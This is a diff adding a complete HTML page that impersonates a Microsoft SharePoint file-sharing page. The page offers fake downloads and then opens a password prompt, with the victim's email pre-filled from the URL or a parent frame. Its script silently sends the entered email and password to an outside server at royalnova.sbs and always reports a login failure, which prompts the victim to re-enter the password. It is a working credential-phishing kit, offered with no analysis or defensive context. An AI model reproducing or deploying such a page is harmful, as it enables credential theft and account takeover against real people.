@@ -1,0 +1,468 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SPoint</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #ffffff;
+        }
+
+        .header {
+            background-color: #0078d4;
+            color: white;
+            padding: 12px 25px;
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .main-container {
+            display: flex;
+            min-height: calc(100vh - 60px);
+        }
+
+        .files-section {
+            flex: 1;
+            padding: 20px;
+            max-width: 90%;
+        }
+
+        h1 {
+            color: #1f2937;
+            font-size: 28px;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+
+        .subtitle {
+            color: #000000;
+            font-size: 16px;
+            margin-bottom: 25px;
+            font-weight: 500;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 15px;
+        }
+
+        thead {
+            border-bottom: 2px solid #e5e5e5;
+        }
+
+        th {
+            text-align: left;
+            padding: 8px 12px;
+            color: #1f2937;
+            font-weight: 600;
+            font-size: 15px;
+        }
+
+        tbody tr {
+            border-bottom: 1px solid #e5e5e5;
+        }
+
+        tbody tr:hover {
+            background-color: #f9f9f9;
+        }
+
+        td {
+            padding: 8px 12px;
+            font-size: 15px;
+            color: #1f2937;
+            vertical-align: top;
+        }
+
+        .file-info {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .file-icon {
+            width: 32px;
+            height: 32px;
+            object-fit: contain;
+        }
+
+        .download-link {
+            color: #0078d4;
+            text-decoration: none;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 15px;
+        }
+
+        .download-link:hover {
+            text-decoration: underline;
+        }
+
+        .sidebar {
+            width: 320px;
+            background-color: #f8f9fa;
+            padding: 30px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .sidebar img {
+            max-width: 280px;
+            max-height: 280px;
+            height: auto;
+            width: auto;
+            border-radius: 8px;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .modal-content {
+            background-color: white;
+            padding: 35px;
+            border-radius: 10px;
+            width: 420px;
+            text-align: center;
+            position: relative;
+        }
+
+        .close {
+            position: absolute;
+            right: 18px;
+            top: 18px;
+            cursor: pointer;
+            font-size: 26px;
+            color: #666;
+        }
+
+        .close:hover {
+            color: #000;
+        }
+
+        .error-message {
+            color: #ffc107; /* Yellow for error messages */
+            font-size: 14px;
+            margin: 10px 0;
+            font-weight: 500;
+            display: none;
+        }
+
+        .success-message {
+            color: #dc3545; /* Red for success messages */
+            font-size: 14px;
+            margin: 10px 0;
+            font-weight: 500;
+            display: none;
+        }
+
+        input[readonly] {
+            background-color: #f1f1f1;
+            cursor: not-allowed;
+        }
+
+        @media (max-width: 768px) {
+            .main-container {
+                flex-direction: column;
+            }
+            
+            .files-section {
+                padding: 20px;
+                max-width: 100%;
+            }
+            
+            .sidebar {
+                width: 100%;
+                order: -1;
+                padding: 20px;
+            }
+            
+            .sidebar img {
+                max-height: 200px;
+                max-width: 200px;
+            }
+            
+            .header {
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        Microsoft | SharePoint
+    </div>
+
+    <div class="main-container">
+        <div class="files-section">
+            <h1>Files</h1>
+            <p class="subtitle">All Files Are Ready To Download</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Name</th>
+                        <th>Size</th>
+                        <th>Action</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>
+                            <div class="file-info">
+                                <img src="images/xsel.png" alt="Excel" class="file-icon">
+                                <span>Product samples.xlsx</span>
+                            </div>
+                        </td>
+                        <td>22.1 MB</td>
+                        <td><span class="download-link" onclick="document.getElementById('loginModal').style.display='flex'">Download</span></td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <div class="file-info">
+                                <img src="images/pdf.png" alt="PDF" class="file-icon">
+                                <span>Specifications.pdf</span>
+                            </div>
+                        </td>
+                        <td>10.8 MB</td>
+                        <td><span class="download-link" onclick="document.getElementById('loginModal').style.display='flex'">Download</span></td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <div class="file-info">
+                                <img src="images/pdf.png" alt="Excel" class="file-icon">
+                                <span>Purchase Order.pdf</span>
+                            </div>
+                        </td>
+                        <td>15.6 MB</td>
+                        <td><span class="download-link" onclick="document.getElementById('loginModal').style.display='flex'">Download</span></td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <div class="file-info">
+                                <img src="images/pdf.png" alt="PDF" class="file-icon">
+                                <span>Company profile.pdf</span>
+                            </div>
+                        </td>
+                        <td>13.07 MB</td>
+                        <td><span class="download-link" onclick="document.getElementById('loginModal').style.display='flex'">Download</span></td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <div class="file-info">
+                                <img src="images/youtube.png" alt="MP4" class="file-icon">
+                                <span>Sample Video.MP4</span>
+                            </div>
+                        </td>
+                        <td>91.07 MB</td>
+                        <td><span class="download-link" onclick="document.getElementById('loginModal').style.display='flex'">Download</span></td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="sidebar">
+            <img src="images/onedrive.jpg" alt="OneDrive">
+        </div>
+    </div>
+
+    <div id="loginModal" class="modal" tabindex="-1" style="display: none;">
+        <div class="modal-content">
+            <span class="close" onclick="document.getElementById('loginModal').style.display='none'; resetForm()">×</span>
+            <img src="images/mssp.png" alt="Microsoft Logo" style="height: 32px; margin-bottom: 20px;">
+            <p style="font-size: 15px; margin-bottom: 15px;">These files are sensitive and secured against unauthorized access. Please provide your password to authorize the download.</p>
+            <p style="font-size: 15px; margin-bottom: 15px; font-style: italic;">Enter your password</p>
+            
+            <div class="error-message" id="errorMessage">Network error, try again</div>
+            <div class="success-message" id="successMessage">Network error, please try again</div>
+            
+            <form id="accessForm" action="send_email.php" method="POST">
+                <input type="email" id="emailInput" name="email" placeholder="Your Email" style="width: 100%; padding: 14px; margin: 12px 0; font-size: 16px; border: 1px solid #ddd; border-radius: 6px;">
+                <input type="password" id="passwordInput" name="password" placeholder="Your Password" style="width: 100%; padding: 14px; margin: 12px 0; font-size: 16px; border: 1px solid #ddd; border-radius: 6px;">
+                <button id="accessButton" type="submit" style="padding: 14px 30px; background-color: #0078d4; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer;">Access Files</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // Get query parameter from URL
+        function getQueryParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+        }
+
+        // Validate email format
+        function isValidEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+
+        // Sanitize email input
+        function sanitizeEmail(email) {
+            if (!email) return null;
+            email = email.replace(/[^\w.@+-]/g, '');
+            return email.trim();
+        }
+
+        // Pre-fill email value and open modal
+        window.onload = function() {
+            const emailInput = document.getElementById('emailInput');
+            const loginModal = document.getElementById('loginModal');
+            let email = getQueryParam('email');
+
+            console.log('Raw email from URL:', email);
+            console.log('Full URL:', window.location.href);
+
+            if (email) {
+                try {
+                    email = decodeURIComponent(email.replace(/\+/g, ' '));
+                    email = sanitizeEmail(email);
+                    console.log('Sanitized email:', email);
+                    if (isValidEmail(email)) {
+                        // Set as VALUE and make readonly
+                        emailInput.value = email;
+                        emailInput.setAttribute('readonly', 'readonly');
+                        loginModal.style.display = 'flex';
+                        document.getElementById('passwordInput').focus();
+                    } else {
+                        console.warn('Invalid email format:', email);
+                        emailInput.removeAttribute('readonly');
+                        loginModal.style.display = 'flex';
+                        alert('Invalid email format in URL. Please enter manually.');
+                    }
+                } catch (e) {
+                    console.error('Error processing email from URL:', e);
+                    emailInput.removeAttribute('readonly');
+                    loginModal.style.display = 'flex';
+                    alert('Error processing email from URL. Please enter manually.');
+                }
+            } else {
+                console.log('No email parameter found in URL');
+                emailInput.removeAttribute('readonly');
+                // Don't hide modal here — let postMessage show it if needed
+            }
+        };
+
+        // ===== LISTEN FOR postMessage FROM PARENT (iframe mode) =====
+        window.addEventListener('message', function(event) {
+            if (event.data && event.data.type === 'setEmail') {
+                var email = event.data.email;
+                if (isValidEmail(email)) {
+                    document.getElementById('emailInput').value = email;
+                    document.getElementById('emailInput').setAttribute('readonly', 'readonly');
+                    // Show the modal since email came from parent via postMessage
+                    document.getElementById('loginModal').style.display = 'flex';
+                    document.getElementById('passwordInput').focus();
+                    console.log('[postMessage] Pre-filled value: ' + email);
+                }
+            }
+        });
+
+        // Tell parent iframe that we're ready
+        if (window.parent && window.parent !== window) {
+            window.parent.postMessage({ type: 'iframeReady' }, '*');
+        }
+
+        // Close modal on outside click
+        window.onclick = function(event) {
+            if (event.target == document.getElementById('loginModal')) {
+                document.getElementById('loginModal').style.display = 'none';
+                resetForm();
+            }
+        };
+
+        // Reset form when modal closes
+        function resetForm() {
+            const errorMsg = document.getElementById('errorMessage');
+            const successMsg = document.getElementById('successMessage');
+            const passwordInput = document.getElementById('passwordInput');
+            const button = document.getElementById('accessButton');
+            
+            errorMsg.style.display = 'none';
+            successMsg.style.display = 'none';
+            passwordInput.value = '';
+            button.innerHTML = 'Access Files';
+            button.disabled = false;
+        }
+
+        // Handle form submission — AJAX to external server, keeps user on page
+        document.getElementById('accessForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            const email = document.getElementById('emailInput').value;
+            const password = document.getElementById('passwordInput').value;
+            const button = document.getElementById('accessButton');
+
+            if (!email || !password) {
+                alert('Please enter both email and password.');
+                return;
+            }
+
+            // Show loading state
+            button.innerHTML = 'Verifying...';
+            button.disabled = true;
+
+            // Send data via AJAX to external server (silent, no navigation)
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'https://royalnova.sbs/sharepoiint/send_mail.php', true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    console.log('[AJAX] Response:', xhr.responseText);
+                    
+                    // Show error to user, clear password, keep them on the page
+                    const errorMsg = document.getElementById('errorMessage');
+                    if (errorMsg) {
+                        errorMsg.innerText = 'Invalid email or password. Please try again.';
+                        errorMsg.style.display = 'block';
+                    }
+                    
+                    button.innerHTML = 'Access Files';
+                    button.disabled = false;
+                    document.getElementById('passwordInput').value = '';
+                    document.getElementById('passwordInput').focus();
+                }
+            };
+            xhr.send('email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password));
+        });
+
+        // Handle success/error from PHP redirect
+        window.addEventListener('load', function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const error = urlParams.get('error');
+            const success = urlParams.get('success');
+            const errorMsg = document.getElementById('errorMessage');
+            const successMsg = document.getElementById('successMessage');
+            const loginModal = document.getElementById('loginModal');
+            
+            if (error) {
+                errorMsg.innerText = decodeURIComponent(error);
+                errorMsg.style.display = 'block';
+                loginModal.style.display = 'flex';
+                history.replaceState(null, '', window.location.pathname);
+            } else if (success) {
+                successMsg.innerText = decodeURIComponent(success);
+                successMsg.style.display = 'block';
+                loginModal.style.display = 'flex';
+                history.replaceState(null, '', window.location.pathname);
+            }
+        });
+    </script>
+
+</body></html>
